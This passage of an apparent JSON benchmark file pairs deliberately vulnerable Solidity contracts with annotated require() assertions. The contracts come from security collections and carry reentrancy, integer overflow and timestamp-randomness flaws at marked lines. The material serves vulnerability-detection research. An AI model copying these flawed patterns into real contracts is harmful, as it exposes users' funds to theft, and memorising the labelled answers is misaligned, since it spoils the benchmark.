            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 27\n */\n\n//added pragma version\npragma solidity ^0.4.10;\n\ncontract EtherStore {\n\n    uint256 public withdrawalLimit = 1 ether;\n    mapping(address => uint256) public lastWithdrawTime;\n    mapping(address => uint256) public balances;\n\n    function depositFunds() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds (uint256 _weiToWithdraw) public {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        // limit the withdrawal\n        require(_weiToWithdraw <= withdrawalLimit);\n        // limit the time allowed to withdraw\n        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);\n\n        require(msg.sender.call.value(_weiToWithdraw)());\n        balances[msg.sender] -= _weiToWithdraw;\n        lastWithdrawTime[msg.sender] = now;\n    }\n }",
            {
                "VL": [
                    26,
                    "require(_weiToWithdraw<=address(this).balance);"
                ],
                "pre": [
                    21,
                    "require(_weiToWithdraw>0);"
                ],
                "post": [
                    30,
                    "require(balances[msg.sender]>=0);"
                ]
            }
        ]
    ],
    "0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract U_BANK\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 2 ether;    \n\n    function U_BANK(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    28,
                    "require(_am<=acc.balance);"
                ],
                "pre": [
                    25,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    35,
                    "require(acc.balance>=MinSum);"
                ]
            }
        ]
    ],
    "0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract X_WALLET\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function X_WALLET(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    28,
                    "require(_am<=acc.balance);"
                ],
                "pre": [
                    25,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    35,
                    "require(acc.balance>=MinSum);"
                ]
            }
        ]
    ],
    "etherbank.sol": [
        [
            "/*\n * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/reentrant.sol\n * @author: -\n * @vulnerable_at_lines: 21\n */\n\npragma solidity ^0.4.0;\ncontract EtherBank{\n    mapping (address => uint) userBalances;\n    function getBalance(address user) constant returns(uint) {  \n\t\treturn userBalances[user];\n\t}\n\n\tfunction addToBalance() {  \n\t\tuserBalances[msg.sender] += msg.value;\n\t}\n\n\tfunction withdrawBalance() {  \n\t\tuint amountToWithdraw = userBalances[msg.sender];\n\n\t\tif (!(msg.sender.call.value(amountToWithdraw)())) { throw; }\n\t\tuserBalances[msg.sender] = 0;\n\t}    \n}",
            {
                "VL": [
                    20,
                    "require(amountToWithdraw>0);"
                ],
                "pre": [
                    19,
                    "require(userBalances[msg.sender]>0);"
                ],
                "post": [
                    23,
                    "require(false);"
                ]
            }
        ]
    ],
    "integer_overflow_1.sol": [
        [
            "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/integer_overflow/integer_overflow_1.sol\n * @author: -\n * @vulnerable_at_lines: 14\n */\n\n pragma solidity ^0.4.15;\n\n contract Overflow {\n     uint private sellerBalance=0;\n\n     function add(uint value) returns (bool){\n\n         sellerBalance += value; // possible overflow\n\n         // possible auditor assert\n         // assert(sellerBalance >= value);\n     }\n\n  // function safe_add(uint value) returns (bool){\n  //   require(value + sellerBalance >= sellerBalance);\n  // sellerBalance += value;\n  // } \n }",
            {
                "VL": [
                    13,
                    "require(value+sellerBalance>=sellerBalance);"
                ],
                "pre": [
                    13,
                    "require(value+sellerBalance>=sellerBalance);"
                ],
                "post": [
                    18,
                    "require(sellerBalance>=value);"
                ]
            }
        ]
    ],
    "integer_overflow_mapping_sym_1.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_mapping_sym_1.sol\n * @author: -\n * @vulnerable_at_lines: 16\n */\n\n//Single transaction overflow\n\npragma solidity ^0.4.11;\n\ncontract IntegerOverflowMappingSym1 {\n    mapping(uint256 => uint256) map;\n\n    function init(uint256 k, uint256 v) public {\n\n        map[k] -= v;\n    }\n}",
            {
                "VL": [
                    15,
                    "require(k>0);"
                ],
                "pre": [
                    15,
                    "require(k>0);"
                ],
                "post": [
                    17,
                    "require(map[k]==0);"
                ]
            }
        ]
    ],
    "integer_overflow_benign_1.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_benign_1.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow never escapes function\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowBenign1 {\n    uint public count = 1;\n\n    function run(uint256 input) public {\n\n        uint res = count - input;\n    }\n}",
            {
                "VL": [
                    16,
                    "require(input<count);"
                ],
                "pre": [
                    16,
                    "require(input<count);"
                ],
                "post": [
                    18,
                    "require(res==0);"
                ]
            }
        ]
    ],
    "integer_overflow_mul.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_mul.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowMul {\n    uint public count = 2;\n\n    function run(uint256 input) public {\n\n        count *= input;\n    }\n}",
            {
                "VL": [
                    16,
                    "require(input<count);"
                ],
                "pre": [
                    16,
                    "require(input<count);"
                ],
                "post": [
                    18,
                    "require(count==4);"
                ]
            }
        ]
    ],
    "tokensalechallenge.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101 // https://capturetheether.com/challenges/math/token-sale/\n * @author: Steve Marx\n * @vulnerable_at_lines: 23,25,33\n */\n\npragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge {\n    mapping(address => uint256) public balanceOf;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _player) public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance < 1 ether;\n    }\n\n    function buy(uint256 numTokens) public payable {\n\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\n\n        balanceOf[msg.sender] += numTokens;\n    }\n\n    function sell(uint256 numTokens) public {\n        require(balanceOf[msg.sender] >= numTokens);\n\n        balanceOf[msg.sender] -= numTokens;\n\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n    }\n}",
            {
                "VL": [
                    22,
                    "require(balanceOf[msg.sender]+numTokens<=100);"
                ],
                "pre": [
                    22,
                    "require(balanceOf[msg.sender]+numTokens<=100);"
                ],
                "post": [
                    26,
                    "require(balanceOf[msg.sender]<=100);"
                ]
            }
        ],
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101 // https://capturetheether.com/challenges/math/token-sale/\n * @author: Steve Marx\n * @vulnerable_at_lines: 23,25,33\n */\n\npragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge {\n    mapping(address => uint256) public balanceOf;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _player) public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance < 1 ether;\n    }\n\n    function buy(uint256 numTokens) public payable {\n\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\n\n        balanceOf[msg.sender] += numTokens;\n    }\n\n    function sell(uint256 numTokens) public {\n        require(balanceOf[msg.sender] >= numTokens);\n\n        balanceOf[msg.sender] -= numTokens;\n\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n    }\n}",
            {
                "VL": [
                    24,
                    "require(balanceOf[msg.sender]+numTokens<=100);"
                ],
                "pre": [
                    22,
                    "require(balanceOf[msg.sender]+numTokens<=100);"
                ],
                "post": [
                    26,
                    "require(balanceOf[msg.sender]<=100);"
                ]
            }
        ],
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101 // https://capturetheether.com/challenges/math/token-sale/\n * @author: Steve Marx\n * @vulnerable_at_lines: 23,25,33\n */\n\npragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge {\n    mapping(address => uint256) public balanceOf;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _player) public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance < 1 ether;\n    }\n\n    function buy(uint256 numTokens) public payable {\n\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\n\n        balanceOf[msg.sender] += numTokens;\n    }\n\n    function sell(uint256 numTokens) public {\n        require(balanceOf[msg.sender] >= numTokens);\n\n        balanceOf[msg.sender] -= numTokens;\n\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n    }\n}",
            {
                "VL": [
                    32,
                    "require(balanceOf[msg.sender]>=0);"
                ],
                "pre": [
                    29,
                    "require(numTokens>0);"
                ],
                "post": [
                    34,
                    "require(isComplete());"
                ]
            }
        ]
    ],
    "overflow_simple_add.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101#overflow-simple-addsol\n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity 0.4.25;\n\ncontract Overflow_Add {\n    uint public balance = 1;\n\n    function add(uint256 deposit) public {\n\n        balance += deposit;\n    }\n}",
            {
                "VL": [
                    13,
                    "require(deposit<balance);"
                ],
                "pre": [
                    13,
                    "require(deposit<balance);"
                ],
                "post": [
                    15,
                    "require(balance>=deposit);"
                ]
            }
        ]
    ],
    "integer_overflow_minimal.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_minimal.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowMinimal {\n    uint public count = 1;\n\n    function run(uint256 input) public {\n\n        count -= input;\n    }\n}",
            {
                "VL": [
                    16,
                    "require(input>0);"
                ],
                "pre": [
                    16,
                    "require(input>0);"
                ],
                "post": [
                    18,
                    "require(count==0);"
                ]
            }
        ]
    ],
    "token.sol": [
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Steve Marx\n * @vulnerable_at_lines: 20,22\n */\n\n pragma solidity ^0.4.18;\n\n contract Token {\n\n   mapping(address => uint) balances;\n   uint public totalSupply;\n\n   function Token(uint _initialSupply) {\n     balances[msg.sender] = totalSupply = _initialSupply;\n   }\n\n   function transfer(address _to, uint _value) public returns (bool) {\n\n     require(balances[msg.sender] - _value >= 0);\n\n     balances[msg.sender] -= _value;\n     balances[_to] += _value;\n     return true;\n   }\n\n   function balanceOf(address _owner) public constant returns (uint balance) {\n     return balances[_owner];\n   }\n }",
            {
                "VL": [
                    19,
                    "require(_to!=address(0));"
                ],
                "pre": [
                    19,
                    "require(_to!=address(0));"
                ],
                "post": [
                    25,
                    "require(balances[msg.sender]>=_value);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Steve Marx\n * @vulnerable_at_lines: 20,22\n */\n\n pragma solidity ^0.4.18;\n\n contract Token {\n\n   mapping(address => uint) balances;\n   uint public totalSupply;\n\n   function Token(uint _initialSupply) {\n     balances[msg.sender] = totalSupply = _initialSupply;\n   }\n\n   function transfer(address _to, uint _value) public returns (bool) {\n\n     require(balances[msg.sender] - _value >= 0);\n\n     balances[msg.sender] -= _value;\n     balances[_to] += _value;\n     return true;\n   }\n\n   function balanceOf(address _owner) public constant returns (uint balance) {\n     return balances[_owner];\n   }\n }",
            {
                "VL": [
                    21,
                    "require(balances[_to]+_value>=balances[_to]);"
                ],
                "pre": [
                    19,
                    "require(_to!=address(0));"
                ],
                "post": [
                    25,
                    "require(balances[msg.sender]>=_value);"
                ]
            }
        ]
    ],
    "overflow_single_tx.sol": [
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18,24,30,36,42,48\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowSingleTransaction {\n    uint public count = 1;\n\n    // ADD overflow with result stored in state variable.\n    function overflowaddtostate(uint256 input) public {\n\n        count += input;\n    }\n\n    // MUL overflow with result stored in state variable.\n    function overflowmultostate(uint256 input) public {\n\n        count *= input;\n    }\n\n    // Underflow with result stored in state variable.\n    function underflowtostate(uint256 input) public {\n\n        count -= input;\n    }\n\n    // ADD Overflow, no effect on state.\n    function overflowlocalonly(uint256 input) public {\n\n        uint res = count + input;\n    }\n\n    // MUL Overflow, no effect on state.\n    function overflowmulocalonly(uint256 input) public {\n\n        uint res = count * input;\n    }\n\n    // Underflow, no effect on state.\n    function underflowlocalonly(uint256 input) public {\n\n       \tuint res = count - input;\n    }\n\n}",
            {
                "VL": [
                    17,
                    "require(input<count);"
                ],
                "pre": [
                    17,
                    "require(input<2**256-1);"
                ],
                "post": [
                    19,
                    "require(count==input+1);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18,24,30,36,42,48\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowSingleTransaction {\n    uint public count = 1;\n\n    // ADD overflow with result stored in state variable.\n    function overflowaddtostate(uint256 input) public {\n\n        count += input;\n    }\n\n    // MUL overflow with result stored in state variable.\n    function overflowmultostate(uint256 input) public {\n\n        count *= input;\n    }\n\n    // Underflow with result stored in state variable.\n    function underflowtostate(uint256 input) public {\n\n        count -= input;\n    }\n\n    // ADD Overflow, no effect on state.\n    function overflowlocalonly(uint256 input) public {\n\n        uint res = count + input;\n    }\n\n    // MUL Overflow, no effect on state.\n    function overflowmulocalonly(uint256 input) public {\n\n        uint res = count * input;\n    }\n\n    // Underflow, no effect on state.\n    function underflowlocalonly(uint256 input) public {\n\n       \tuint res = count - input;\n    }\n\n}",
            {
                "VL": [
                    23,
                    "require(input<2**256);"
                ],
                "pre": [
                    23,
                    "require(input<2**256);"
                ],
                "post": [
                    25,
                    "require(count==0);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18,24,30,36,42,48\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowSingleTransaction {\n    uint public count = 1;\n\n    // ADD overflow with result stored in state variable.\n    function overflowaddtostate(uint256 input) public {\n\n        count += input;\n    }\n\n    // MUL overflow with result stored in state variable.\n    function overflowmultostate(uint256 input) public {\n\n        count *= input;\n    }\n\n    // Underflow with result stored in state variable.\n    function underflowtostate(uint256 input) public {\n\n        count -= input;\n    }\n\n    // ADD Overflow, no effect on state.\n    function overflowlocalonly(uint256 input) public {\n\n        uint res = count + input;\n    }\n\n    // MUL Overflow, no effect on state.\n    function overflowmulocalonly(uint256 input) public {\n\n        uint res = count * input;\n    }\n\n    // Underflow, no effect on state.\n    function underflowlocalonly(uint256 input) public {\n\n       \tuint res = count - input;\n    }\n\n}",
            {
                "VL": [
                    29,
                    "require(input<count);"
                ],
                "pre": [
                    29,
                    "require(input<count);"
                ],
                "post": [
                    31,
                    "require(count==0);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18,24,30,36,42,48\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowSingleTransaction {\n    uint public count = 1;\n\n    // ADD overflow with result stored in state variable.\n    function overflowaddtostate(uint256 input) public {\n\n        count += input;\n    }\n\n    // MUL overflow with result stored in state variable.\n    function overflowmultostate(uint256 input) public {\n\n        count *= input;\n    }\n\n    // Underflow with result stored in state variable.\n    function underflowtostate(uint256 input) public {\n\n        count -= input;\n    }\n\n    // ADD Overflow, no effect on state.\n    function overflowlocalonly(uint256 input) public {\n\n        uint res = count + input;\n    }\n\n    // MUL Overflow, no effect on state.\n    function overflowmulocalonly(uint256 input) public {\n\n        uint res = count * input;\n    }\n\n    // Underflow, no effect on state.\n    function underflowlocalonly(uint256 input) public {\n\n       \tuint res = count - input;\n    }\n\n}",
            {
                "VL": [
                    35,
                    "require(input<count);"
                ],
                "pre": [
                    35,
                    "require(input<count);"
                ],
                "post": [
                    37,
                    "require(res>=count);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18,24,30,36,42,48\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowSingleTransaction {\n    uint public count = 1;\n\n    // ADD overflow with result stored in state variable.\n    function overflowaddtostate(uint256 input) public {\n\n        count += input;\n    }\n\n    // MUL overflow with result stored in state variable.\n    function overflowmultostate(uint256 input) public {\n\n        count *= input;\n    }\n\n    // Underflow with result stored in state variable.\n    function underflowtostate(uint256 input) public {\n\n        count -= input;\n    }\n\n    // ADD Overflow, no effect on state.\n    function overflowlocalonly(uint256 input) public {\n\n        uint res = count + input;\n    }\n\n    // MUL Overflow, no effect on state.\n    function overflowmulocalonly(uint256 input) public {\n\n        uint res = count * input;\n    }\n\n    // Underflow, no effect on state.\n    function underflowlocalonly(uint256 input) public {\n\n       \tuint res = count - input;\n    }\n\n}",
            {
                "VL": [
                    41,
                    "require(input>0);"
                ],
                "pre": [
                    41,
                    "require(input>0);"
                ],
                "post": [
                    43,
                    "require(res==0);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18,24,30,36,42,48\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowSingleTransaction {\n    uint public count = 1;\n\n    // ADD overflow with result stored in state variable.\n    function overflowaddtostate(uint256 input) public {\n\n        count += input;\n    }\n\n    // MUL overflow with result stored in state variable.\n    function overflowmultostate(uint256 input) public {\n\n        count *= input;\n    }\n\n    // Underflow with result stored in state variable.\n    function underflowtostate(uint256 input) public {\n\n        count -= input;\n    }\n\n    // ADD Overflow, no effect on state.\n    function overflowlocalonly(uint256 input) public {\n\n        uint res = count + input;\n    }\n\n    // MUL Overflow, no effect on state.\n    function overflowmulocalonly(uint256 input) public {\n\n        uint res = count * input;\n    }\n\n    // Underflow, no effect on state.\n    function underflowlocalonly(uint256 input) public {\n\n       \tuint res = count - input;\n    }\n\n}",
            {
                "VL": [
                    47,
                    "require(input<count);"
                ],
                "pre": [
                    47,
                    "require(input<count);"
                ],
                "post": [
                    49,
                    "require(res<count);"
                ]
            }
        ]
    ],
    "integer_overflow_add.sol": [
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite/blob/master/benchmarks/integer_overflow_add.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowAdd {\n    uint public count = 1;\n\n    function run(uint256 input) public {\n\n        count += input;\n    }\n}",
            {
                "VL": [
                    16,
                    "require(count<10);"
                ],
                "pre": [
                    16,
                    "require(count<10);"
                ],
                "post": [
                    18,
                    "require(count==2);"
                ]
            }
        ]
    ],
    "integer_overflow_multitx_onefunc_feasible.sol": [
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 22\n */\n\n//Multi-transactional, single function\n//Arithmetic instruction reachable\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowMultiTxOneFuncFeasible {\n    uint256 private initialized = 0;\n    uint256 public count = 1;\n\n    function run(uint256 input) public {\n        if (initialized == 0) {\n            initialized = 1;\n            return;\n        }\n\n        count -= input;\n    }\n}",
            {
                "VL": [
                    21,
                    "require(count>=input);"
                ],
                "pre": [
                    17,
                    "require(initialized==0);"
                ],
                "post": [
                    23,
                    "require(count>=0);"
                ]
            }
        ]
    ],
    "timelock.sol": [
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: -\n * @vulnerable_at_lines: 22\n */\n\n//added pragma version\n pragma solidity ^0.4.10;\n \n contract TimeLock {\n\n     mapping(address => uint) public balances;\n     mapping(address => uint) public lockTime;\n\n     function deposit() public payable {\n         balances[msg.sender] += msg.value;\n         lockTime[msg.sender] = now + 1 weeks;\n     }\n\n     function increaseLockTime(uint _secondsToIncrease) public {\n\n         lockTime[msg.sender] += _secondsToIncrease;\n     }\n\n     function withdraw() public {\n         require(balances[msg.sender] > 0);\n         require(now > lockTime[msg.sender]);\n         uint transferValue = balances[msg.sender];\n         balances[msg.sender] = 0;\n         msg.sender.transfer(transferValue);\n     }\n }",
            {
                "VL": [
                    21,
                    "require(balances[msg.sender]>0);"
                ],
                "pre": [
                    21,
                    "require(balances[msg.sender]>0);"
                ],
                "post": [
                    23,
                    "require(lockTime[msg.sender]>now);"
                ]
            }
        ]
    ],
    "insecure_transfer.sol": [
        [
            "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/#front-running-aka-transaction-ordering-dependence\n * @author: consensys\n * @vulnerable_at_lines: 18\n */\n\npragma solidity ^0.4.10;\n\ncontract IntegerOverflowAdd {\n    mapping (address => uint256) public balanceOf;\n\n    // INSECURE\n    function transfer(address _to, uint256 _value) public{\n        /* Check if sender has balance */\n        require(balanceOf[msg.sender] >= _value);\n        balanceOf[msg.sender] -= _value;\n\n        balanceOf[_to] += _value;\n}\n\n}",
            {
                "VL": [
                    17,
                    "require(balanceOf[_to]+_value>=balanceOf[_to]);"
                ],
                "pre": [
                    14,
                    "require(_to!=address(0));"
                ],
                "post": [
                    19,
                    "require(balanceOf[_to]<=2**256-1);"
                ]
            }
        ]
    ],
    "integer_overflow_multitx_multifunc_feasible.sol": [
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 25\n */\n\n//Multi-transactional, multi-function\n//Arithmetic instruction reachable\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowMultiTxMultiFuncFeasible {\n    uint256 private initialized = 0;\n    uint256 public count = 1;\n\n    function init() public {\n        initialized = 1;\n    }\n\n    function run(uint256 input) {\n        if (initialized == 0) {\n            return;\n        }\n\n        count -= input;\n    }\n}",
            {
                "VL": [
                    24,
                    "require(count>=input);"
                ],
                "pre": [
                    21,
                    "require(initialized==1);"
                ],
                "post": [
                    26,
                    "require(count>=0);"
                ]
            }
        ]
    ],
    "ether_lotto.sol": [
        [
            "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xa11e4ed59dc94e69612f3111942626ed513cb172#code\n * @vulnerable_at_lines: 43\n * @author: -\n */\n\n pragma solidity ^0.4.15;\n\n/// @title Ethereum Lottery Game.\n\ncontract EtherLotto {\n\n    // Amount of ether needed for participating in the lottery.\n    uint constant TICKET_AMOUNT = 10;\n\n    // Fixed amount fee for each lottery game.\n    uint constant FEE_AMOUNT = 1;\n\n    // Address where fee is sent.\n    address public bank;\n\n    // Public jackpot that each participant can win (minus fee).\n    uint public pot;\n\n    // Lottery constructor sets bank account from the smart-contract owner.\n    function EtherLotto() {\n        bank = msg.sender;\n    }\n\n    // Public function for playing lottery. Each time this function\n    // is invoked, the sender has an oportunity for winning pot.\n    function play() payable {\n\n        // Participants must spend some fixed ether before playing lottery.\n        assert(msg.value == TICKET_AMOUNT);\n\n        // Increase pot for each participant.\n        pot += msg.value;\n\n        // Compute some *almost random* value for selecting winner from current transaction.\n\n        var random = uint(sha3(block.timestamp)) % 2;\n\n        // Distribution: 50% of participants will be winners.\n        if (random == 0) {\n\n            // Send fee to bank account.\n            bank.transfer(FEE_AMOUNT);\n\n            // Send jackpot to winner.\n            msg.sender.transfer(pot - FEE_AMOUNT);\n\n            // Restart jackpot.\n            pot = 0;\n        }\n    }\n\n}",
            {
                "VL": [
                    42,
                    "require(pot>0);"
                ],
                "pre": [
                    34,
                    "require(pot<this.balance);"
                ],
                "post": [
                    57,
                    "require(false);"
                ]
            }
        ]
    ],
    "lottopollo.sol": [
        [
            "/*\n * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/timestampdependent.sol\n * @author: -\n * @vulnerable_at_lines: 13,27\n */\n\npragma solidity ^0.4.0;\ncontract lottopollo {\n  address leader;\n  uint    timestamp;\n  function payOut(uint rand) internal {\n\n    if ( rand> 0 && now - rand > 24 hours ) {\n      msg.sender.send( msg.value );\n\n      if ( this.balance > 0 ) {\n        leader.send( this.balance );\n      }\n    }\n    else if ( msg.value >= 1 ether ) {\n      leader = msg.sender;\n      timestamp = rand;\n    }\n  }\n  function randomGen() constant returns (uint randomNumber) {\n\n      return block.timestamp;   \n    }\n  function draw(uint seed){\n    uint randomNumber=randomGen(); \n    payOut(randomNumber);\n  }\n}",
            {
                "VL": [
                    12,
                    "require(msg.value>=1ether);"
                ],
                "pre": [
                    12,
                    "require(msg.value>=1ether);"
                ],
                "post": [
                    24,
                    "require(msg.value>=1ether);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/timestampdependent.sol\n * @author: -\n * @vulnerable_at_lines: 13,27\n */\n\npragma solidity ^0.4.0;\ncontract lottopollo {\n  address leader;\n  uint    timestamp;\n  function payOut(uint rand) internal {\n\n    if ( rand> 0 && now - rand > 24 hours ) {\n      msg.sender.send( msg.value );\n\n      if ( this.balance > 0 ) {\n        leader.send( this.balance );\n      }\n    }\n    else if ( msg.value >= 1 ether ) {\n      leader = msg.sender;\n      timestamp = rand;\n    }\n  }\n  function randomGen() constant returns (uint randomNumber) {\n\n      return block.timestamp;   \n    }\n  function draw(uint seed){\n    uint randomNumber=randomGen(); \n    payOut(randomNumber);\n  }\n}",
            {
                "VL": [
                    26,
                    "require(msg.sender==leader);"
                ],
                "pre": [
                    26,
                    "require(msg.sender==leader);"
                ],
                "post": [
                    28,
                    "require(msg.value>=1ether);"
                ]
            }
        ]
    ],
    "timed_crowdsale.sol": [
        [
